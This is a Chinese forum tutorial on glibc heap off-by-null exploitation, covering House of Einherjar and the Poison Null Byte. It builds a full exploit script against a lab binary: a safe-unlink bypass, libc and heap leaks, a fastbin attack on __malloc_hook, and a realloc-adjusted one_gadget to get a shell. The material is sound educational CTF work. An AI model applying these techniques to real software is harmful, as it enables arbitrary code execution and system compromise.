> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.52pojie.cn](https://www.52pojie.cn/thread-1558739-1-1.html)

> [md]## Off-By-NullOff By Null 和 Off By One 差别在于只能溢出一个 Null Byte 而不是一个可控的字符相比之下难度更大一些，这一节主要是两个利用 Off by Null......

 ![](https://avatar.52pojie.cn/data/avatar/001/57/34/12_avatar_middle.jpg) 呆毛王与咖喱棒 _ 本帖最后由 呆毛王与咖喱棒 于 2021-12-11 20:27 编辑_  

Off-By-Null
-----------

Off By Null 和 Off By One 差别在于只能溢出一个 Null Byte 而不是一个可控的字符

相比之下难度更大一些，这一节主要是两个利用 Off by Null 漏洞的方法

*   House of Einherjar 思路是清除一个申请了的 chunk 的 prev_inuse 位，之后在 free 的时候触发 consolidate 使得前一个 chunk 存在两个指针；
    
*   Google Posion Null Byte 则是针对 free 掉了的 chunk，通过修改 free chunk 的大小，使被溢出的 chunk 被再次申请时错误更新 prev_inuse 位，最终 free 后一个 chunk 时触发 consolidate。
    

### House of Einherjar

可以 malloc 三次 smallbin，溢出一个 Null byte

构造一个 chunk_B 大小 0x100，清掉 prev_inuse 位，伪造一个 prev_size 到 user 的位置

user 里面把 fd、bk 都设置成自己绕过 safe unlink 检查

```
username = p64(0) + p64(0x91) + p64(elf.sym.user) + p64(elf.sym.user)

chunk_A = malloc(0x88)
chunk_B = malloc(0xf8)

edit(chunk_A, p64(0)*16+p64(heap-elf.sym.user+0x90))

# consolidate
free(chunk_B)

```

这样在 free 的时候提示了一个错误 corrupted size vs. prev_size

![](https://static.hack1s.fun/images/2021/11/26/image-20211126213304064.png)

这部分比较的具体内容是这里

```
chunksize(P)!=prev_size(next_chunk(P))

```

也就是在 user 处伪造的 chunk size 0x91 和

从 0x91 这个 chunk 找到下一个 chunk，看这个 chunk 的 prev_inuse 字段

发现这两个值不相等

一个简单的绕过方法就是将伪造的这个值设置为 8，这样通过`prev_size(next_chunk(P))`找到的也是这个 8 本身，就发现两者相等

![](https://static.hack1s.fun/images/2021/11/26/image-20211126213632590.png)

虽然这个值不是一个有效的 chunk size，但是可以这样绕过

接下来 free B 时发生 consolidate，直接从 Top chunk 合并到 user 这里

![](https://static.hack1s.fun/images/2021/11/26/image-20211126213820733.png)

因为 top chunk 都到这里了，接下来直接申请一个新的 chunk 就可以修改下面的 target 了

### Posion Null Byte

前面的思路是消除一个已经申请了的 chunk 的 prev_inuse

然后利用 consolidate 得到一个 dup 的指针

而 Off By Null 还有一种针对已经 free 掉的 chunk 的利用方法，最初是 2014 年时 glibc 中被爆出一个堆上的 off by null 漏洞，google project zero 的一个人利用这个漏洞获取到了代码执行的权限，后续又在实际的程序上进行了利用 (pkexec)

*   [pkexec 利用](https://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html)
    
*   [CVE-2014-5119](https://sourceware.org/bugzilla/show_bug.cgi?id=17187)
    
*   [Glibc 上的利用](https://bugs.chromium.org/p/project-zero/issues/detail?id=96&redir=1)
    

这里有三个链接可以参考一下；

#### 原理

举例说明的话，首先申请三个 chunk

![](https://static.hack1s.fun/images/2021/12/09/image-20211209144048031.png)

头尾不重要，中间的 chunk 假设大小是 0x210，将其 free 掉之后可以得到图中左边的状态

这时利用 Null Byte 的溢出修改这个 chunk 的大小为 0x200，但是 chunk_C 处的 prev_size 是没有变化的

接下来申请两次 0x100，这里会触发之前介绍过的 [remaindering](https://hack1s.fun/2021/11/16/heaplab-off-by-one/)，分割成了两个 0x100 的 chunk

![](https://static.hack1s.fun/images/2021/12/09/image-20211209151342001.png)

但是由于 chunk_B 的大小被溢出改成了 0x200，chunk_C 的 prev_inuse 并没有被设置为 1

而是更新到了 B2 和 C 之间的 0x10 字节上

这时执行`free(chunk_C)`，由于 C 的 prev_inuse 是 0，并且 prev_size 是 0x210

会直接将 C 和 B1、B2 合并 (consolidate) 全部 free 掉

这时再次申请的内容就会与 chunk_B1、chunk_B2 发生重叠

![](https://static.hack1s.fun/images/2021/12/09/image-20211209150251569.png)

这样就可以得到一个 overlap 的指针，而有了 overlap 的指针就可以进一步实施 unsortedbin attack、fastbin attack 等等

#### 实践

![](https://static.hack1s.fun/images/2021/12/09/image-20211209124512191.png)

这个文件的保护机制全部都是打开的状态

堆菜单的功能有 malloc、edit、free 和 read

但是这个程序没有泄漏出堆地址和 libc 的地址

栈上保存着一个变量 m_array，用于存储堆申请 chunk 的相关信息

每一项有两个 8 字节组成，user_data 是申请空间的地址，request_size 是申请的大小

![](https://static.hack1s.fun/images/2021/12/09/image-20211209125919505.png)

漏洞在于 edit 函数中

![](https://static.hack1s.fun/images/2021/12/09/image-20211209130229087.png)

这里在执行时首先直接读取申请大小的内容到 user_data 处

```
tmp = read(0, m_array[na].user_data, m_array[na].request_size)

```

read 的返回结果为成功写入的字节

```
m_array[na].user_data[tmp]=0

```

之后这样一个操作在写入的内容后面又加入一个 0

这一个字节也就是溢出的一个 Null 字节

按照上面介绍的原理直接写一下 exploit

```
chunk_A = malloc(0x88)
chunk_B = malloc(0x208)
chunk_C = malloc(0x88)
chunk_D = malloc(0x88)

free(chunk_B)
edit(chunk_A,"a"*0x88)

chunk_B1 = malloc(0xf8)
chunk_B2 = malloc(0xf8)

free(chunk_C)

```

但是这样运行会看到一个熟悉的错误

![](https://static.hack1s.fun/images/2021/12/09/image-20211209152315281.png)

unlink 时出现错误，原因就是 chunk_B 在 safe unlink 时`bk->fd==p && fd->bk==p`这个条件不满足

在以往的程序中要绕过也很容易，只需要将 chunk_B1 的 fd、bk 都设置为自身，就可以通过这个判断；

但是这样的前提是程序存在一个堆的地址泄漏

这里可以使用的方法是将 B1 释放，让它真的是一个 unsortedbin，这样就可以通过 unlink 的条件

![](https://static.hack1s.fun/images/2021/12/09/image-20211209154215937.png)  
overlap 的 chunk 还有 B2，也可以用于进一步的攻击

```
chunk_A = malloc(0x88)
chunk_B = malloc(0x208)
chunk_C = malloc(0x88)
chunk_D = malloc(0x88)

free(chunk_B)
edit(chunk_A,"a"*0x88)

chunk_B1 = malloc(0xf8)
chunk_B2 = malloc(0xf8)

free(chunk_B1)
free(chunk_C)

```

执行 exploit 可以看到触发了 consolidate，chunk_B 和 C 合并后放到了 unsortedbin 中

![](https://static.hack1s.fun/images/2021/12/09/image-20211209154503315.png)

其中绿色是 chunk_B1，蓝色是 chunk_B2，红色是 chunk_C

目前 chunk_B2 的指针还是可用的，接下来先利用 unsortedbin leak 得到 libc 的地址和堆地址

libc 的地址可以通过再次申请 B1，触发 remaindering 之后填在 B2 的 fd 和 bk 处

而堆地址的话，则可以通过释放 chunk_A，将 chunk_A 也加入到 unsortedbin 中

这样更新 fd、bk 时会在 B2 的 fd 写入 main_arena 中的地址，bk 写入 chunk_A 的地址；

![](https://static.hack1s.fun/images/2021/12/09/image-20211209162148870.png)

就可以一次读获取到两个 leak

```
chunk_B1 = malloc(0xf8)
free(chunk_A)

data = read(chunk_B2,16)
libc.address = libc.sym.__malloc_hook - (u64(data[:8])-0x68)
heap = u64(data[8:])

```

有了 libc 的地址，最后利用 fastbin attack 修改 malloc_hook 就可以拿到 shell 了

```
chunk_A = malloc(0x88)
fast = malloc(0x68)
free(fast)

edit(chunk_B2, p64(libc.sym.__malloc_hook - 0x23))
fast = malloc(0x68)

target = malloc(0x68)
edit(target, b'a'*0x13+p64(libc.address+one_gadget))

```

首先把 chunk_A 申请回来

然后申请一个大小为 0x68 的 chunk，这个 chunk 和 B_2 是同一个指针

将其 free 掉加入到 fastbin 中

执行 fastbin attack 将 malloc_hook 修改为 one_gadget

但是执行之后会发现 libc 的几个 one_gadget 都没办法执行

在这里下一个断点调试一下`b *__malloc_hook`

![](https://static.hack1s.fun/images/2021/12/09/image-20211209181740399.png)

三个 one_gadget 需要满足的条件依次为：

*   `rax==NULL`
*   `[rsp+0x30]==NULL`
*   `[rsp+0x50]==NULL`

而运行到这里时，栈的情况为

![](https://static.hack1s.fun/images/2021/12/09/image-20211209181923401.png)

这两个条件都不满足，同时 rax 的值也不是 0

但是可以注意到 0x50 的位置虽然不是 0，但是 0x58 的位置是 0

如果能够想办法让这个 0 在 0x50 处就好了。

这里涉及到一种调整栈的方法，利用 realloc_hook 调整栈

realloc_hook 就在 malloc_hook 的前面，因此利用 fastbin attack 也是可以覆盖这个位置的

realloc 函数开始位置首先有一系列 push，之后执行 realloc_hook

![](https://static.hack1s.fun/images/2021/11/28/image-20211128135341556.png)

将 malloc_hook 填为 realloc 的地址加一个偏移（这样减少 push 的数量达到调整栈的目的）

将 realloc_hook 填为目标的 one_gadget

这样触发时首先执行 malloc_hook 即 realloc 加偏移，之后执行 realloc_hook 即 one_gadget

那么首先我们修改一下 exploit 的最后一行

```
edit(target, b'a'*0xb+p64(libc.address+one_gadget)+p64(libc.sym.realloc+2))

```

要使 0x58 的 0 到 0x50 处，只需要少 push 一个值即可

所以在 malloc_hook 处填写为 realloc+2 的地址

![](https://static.hack1s.fun/images/2021/12/09/image-20211209182836478.png)

再运行一下可以看到这里 0x50 就已经是 0 了，满足了 one_gadget 的条件

最后的 exploit

```
chunk_A = malloc(0x88)
chunk_B = malloc(0x208)
chunk_C = malloc(0x88)
chunk_D = malloc(0x88)

free(chunk_B)
edit(chunk_A,"a"*0x88)
# 溢出一个Null Byte

chunk_B1 = malloc(0xf8)
# renmaindering
chunk_B2 = malloc(0xf8)

free(chunk_B1)
# 将B1加入到unsortedbin，从而绕过safe unlink
free(chunk_C)
# 触发consolidate，B、C的空间都加入到unsortedbin

chunk_B1 = malloc(0xf8)
free(chunk_A)
# 将B2的fd、bk变成libc的泄漏地址和堆的泄漏地址

data = read(chunk_B2,16)
libc.address = libc.sym.__malloc_hook - (u64(data[:8])-0x68)
heap = u64(data[8:])
# 计算得到堆地址和libc地址

chunk_A = malloc(0x88)
# 申请回来chunk_A
fast = malloc(0x68)
free(fast)
# 将B2的位置释放为fastbin

edit(chunk_B2, p64(libc.sym.__malloc_hook - 0x23))
# 利用fastbin attack得到malloc_hook写能力
fast = malloc(0x68)

target = malloc(0x68)

one_gadget = 0xd6fb1
edit(target, b'a'*0xb + p64(libc.address+one_gadget) + p64(libc.sym.realloc+2))
# 利用realloc调整栈

```

不过除了这样调整 one_gadget 的做法，还可以结合 fastbin attack 和 unsortedbin attack，转而修改 free_hook 而不是 malloc_hook

详细可以看[这里](https://hack1s.fun/)

这样就可以直接 free 掉一个`/bin/sh`字符串获得权限了

![](https://static.52pojie.cn/static/image/filetype/zip.gif)

[off-by-null.zip](forum.php?mod=attachment&aid=MjM1NTcwOXw3OThkMTg3OXwxNjM5MzExNTMyfDIxMzQzMXwxNTU4NzM5)

2021-12-9 18:44 上传

点击文件名下载附件

下载积分: 吾爱币 -1 CB  

13.11 KB, 下载次数: 4, 下载积分: 吾爱币 -1 CB ![](https://avatar.52pojie.cn/data/avatar/000/39/72/27_avatar_middle.jpg) 教程写的很详细 非常清晰 谢谢分享 受教了 ![](https://avatar.52pojie.cn/images/noavatar_middle.gif) l520 谢谢学到了 ![](https://avatar.52pojie.cn/images/noavatar_middle.gif) 不错，分析的很透彻 ![](https://avatar.52pojie.cn/images/noavatar_middle.gif) DXZ123 看到代码就感觉很厉害 ![](https://avatar.52pojie.cn/images/noavatar_middle.gif) someonexy 谢谢学到了 ![](https://avatar.52pojie.cn/data/avatar/000/38/50/86_avatar_middle.jpg) jwbdr1230123 学习一下![](https://avatar.52pojie.cn/images/noavatar_middle.gif)lordship 学习了，谢谢分享![](https://avatar.52pojie.cn/images/noavatar_middle.gif)轩宸 谢谢分享![](https://avatar.52pojie.cn/images/noavatar_middle.gif)加奈绘 学习了，感谢分享！